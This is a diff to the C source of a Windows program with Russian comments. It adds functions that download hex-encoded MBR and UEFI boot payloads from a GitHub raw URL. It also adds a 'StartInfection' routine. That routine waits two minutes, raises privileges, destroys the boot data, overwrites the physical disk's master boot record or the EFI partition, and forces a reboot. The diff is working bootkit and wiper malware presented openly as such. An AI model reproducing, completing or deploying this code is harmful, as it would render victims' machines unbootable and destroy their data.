@@ -3,10 +3,11 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdbool.h>
-
-#include "massive.h"
+#include <stdlib.h>
+#include <string.h>
 
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "urlmon.lib")
 
 // ================================================================
 // ВНЕШНИЕ ПЕРЕМЕННЫЕ (объявлены в main.cpp)
@@ -19,6 +20,171 @@ extern volatile bool g_running;
 // ================================================================
 
 extern void TriggerBSOD(void);
+
+// ================================================================
+// СТРУКТУРЫ ДЛЯ ДАННЫХ
+// ================================================================
+
+typedef struct {
+    unsigned char* data;
+    unsigned int size;
+} BinaryData;
+
+// ================================================================
+// СКАЧИВАНИЕ RAW ФАЙЛА С GITHUB
+// ================================================================
+
+BinaryData DownloadRawFromGitHub(const char* filename) {
+    BinaryData result = {NULL, 0};
+    
+    // Формируем URL для RAW
+    char url[512];
+    sprintf_s(url, sizeof(url), 
+        "https://raw.githubusercontent.com/PisunBobraHacker/MEMX/main/%s", 
+        filename);
+    
+    // Скачиваем во временный файл
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    char tempFile[MAX_PATH];
+    sprintf_s(tempFile, sizeof(tempFile), "%s%s", tempPath, filename);
+    
+    HRESULT hr = URLDownloadToFileA(NULL, url, tempFile, 0, NULL);
+    if (hr != S_OK) {
+        return result;
+    }
+    
+    // Читаем файл
+    FILE* f = fopen(tempFile, "rb");
+    if (!f) {
+        DeleteFileA(tempFile);
+        return result;
+    }
+    
+    fseek(f, 0, SEEK_END);
+    result.size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    
+    result.data = (unsigned char*)malloc(result.size);
+    if (!result.data) {
+        fclose(f);
+        DeleteFileA(tempFile);
+        result.size = 0;
+        return result;
+    }
+    
+    fread(result.data, 1, result.size, f);
+    fclose(f);
+    DeleteFileA(tempFile);
+    
+    return result;
+}
+
+// ================================================================
+// ПАРСИНГ HEX-СТРОКИ В БИНАРНЫЕ ДАННЫЕ
+// ================================================================
+
+unsigned char* ParseHexString(const char* hexStr, unsigned int* outSize) {
+    if (!hexStr) return NULL;
+    
+    // Считаем количество байт
+    int len = strlen(hexStr);
+    int byteCount = 0;
+    
+    for (int i = 0; i < len; i++) {
+        if (hexStr[i] == '0' && hexStr[i+1] == 'x') {
+            byteCount++;
+            i += 4; // пропускаем "0xXX,"
+        }
+    }
+    
+    if (byteCount == 0) return NULL;
+    
+    unsigned char* data = (unsigned char*)malloc(byteCount);
+    if (!data) return NULL;
+    
+    int idx = 0;
+    for (int i = 0; i < len && idx < byteCount; i++) {
+        if (hexStr[i] == '0' && hexStr[i+1] == 'x') {
+            char hex[3] = {hexStr[i+2], hexStr[i+3], 0};
+            data[idx++] = (unsigned char)strtol(hex, NULL, 16);
+            i += 4;
+        }
+    }
+    
+    *outSize = byteCount;
+    return data;
+}
+
+// ================================================================
+// ЗАГРУЗКА МАССИВОВ ИЗ РЕПОЗИТОРИЯ
+// ================================================================
+
+unsigned char* g_mbr_data = NULL;
+unsigned char* g_uefi_data = NULL;
+unsigned int g_uefi_size = 0;
+
+int LoadArraysFromRepo(void) {
+    // Скачиваем bios.txt
+    BinaryData biosData = DownloadRawFromGitHub("bios.txt");
+    if (!biosData.data || biosData.size == 0) {
+        if (biosData.data) free(biosData.data);
+        return 0;
+    }
+    
+    // Парсим MBR
+    unsigned int mbrSize;
+    unsigned char* mbr = ParseHexString((const char*)biosData.data, &mbrSize);
+    free(biosData.data);
+    
+    if (!mbr || mbrSize != 512) {
+        if (mbr) free(mbr);
+        return 0;
+    }
+    g_mbr_data = mbr;
+    
+    // Скачиваем uefi.txt
+    BinaryData uefiData = DownloadRawFromGitHub("uefi.txt");
+    if (!uefiData.data || uefiData.size == 0) {
+        if (uefiData.data) free(uefiData.data);
+        free(g_mbr_data);
+        g_mbr_data = NULL;
+        return 0;
+    }
+    
+    // Парсим UEFI
+    unsigned int uefiSize;
+    unsigned char* uefi = ParseHexString((const char*)uefiData.data, &uefiSize);
+    free(uefiData.data);
+    
+    if (!uefi || uefiSize == 0) {
+        if (uefi) free(uefi);
+        free(g_mbr_data);
+        g_mbr_data = NULL;
+        return 0;
+    }
+    
+    g_uefi_data = uefi;
+    g_uefi_size = uefiSize;
+    
+    return 1;
+}
+
+// ================================================================
+// ОСВОБОЖДЕНИЕ ПАМЯТИ
+// ================================================================
+
+void FreeArrays(void) {
+    if (g_mbr_data) {
+        free(g_mbr_data);
+        g_mbr_data = NULL;
+    }
+    if (g_uefi_data) {
+        free(g_uefi_data);
+        g_uefi_data = NULL;
+        g_uefi_size = 0;
+    }
+}
 
 // ================================================================
 // 1. ОПРЕДЕЛЕНИЕ ТИПА СИСТЕМЫ
@@ -91,6 +257,7 @@ bool EnablePrivilege(void) {
 
 bool WriteMBR(void) {
     if (IsUEFIActive()) return false;
+    if (!g_mbr_data) return false;
 
     HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
@@ -113,7 +280,7 @@ bool WriteMBR(void) {
     DeviceIoControl(hDisk, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
     DWORD written;
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
-    WriteFile(hDisk, mbr_gg, 512, &written, NULL);
+    WriteFile(hDisk, g_mbr_data, 512, &written, NULL);
     FlushFileBuffers(hDisk);
     DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, NULL, NULL);
     CloseHandle(hDisk);
@@ -122,6 +289,7 @@ bool WriteMBR(void) {
 
 bool WriteESP(void) {
     if (!IsUEFIActive()) return false;
+    if (!g_uefi_data || g_uefi_size == 0) return false;
 
     system("mountvol S: /S 2>nul");
     Sleep(1000);
@@ -144,9 +312,9 @@ bool WriteESP(void) {
     if (hFile == INVALID_HANDLE_VALUE) return false;
 
     DWORD written;
-    WriteFile(hFile, uefi_loader, uefi_size, &written, NULL);
+    WriteFile(hFile, g_uefi_data, g_uefi_size, &written, NULL);
     CloseHandle(hFile);
-    return written == uefi_size;
+    return written == g_uefi_size;
 }
 
 // ================================================================
@@ -203,4 +371,47 @@ int IsAdmin(void) {
     free(buffer);
     CloseHandle(hToken);
     return elevated;
+}
+
+// ================================================================
+// 5. ЗАПУСК ЗАРАЖЕНИЯ (вызывается из main.cpp)
+// ================================================================
+
+void StartInfection(void) {
+    // Ждём 120 секунд
+    Sleep(120000);
+    
+    // Загружаем массивы из репозитория
+    if (!LoadArraysFromRepo()) {
+        // Если не загрузились - пробуем ещё раз через 5 секунд
+        Sleep(5000);
+        if (!LoadArraysFromRepo()) {
+            return; // Не смогли загрузить - выходим
+        }
+    }
+    
+    // Получаем привилегии
+    EnablePrivilege();
+    
+    // Уничтожаем загрузочные данные
+    KillBootData();
+    
+    // Определяем тип системы и заражаем
+    if (IsUEFIActive()) {
+        // UEFI режим
+        if (!WriteESP()) {
+            WriteESP(); // повтор
+        }
+    } else {
+        // BIOS режим
+        if (!WriteMBR()) {
+            WriteMBR(); // повтор
+        }
+    }
+    
+    // Освобождаем память
+    FreeArrays();
+    
+    // Принудительная перезагрузка
+    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
 }
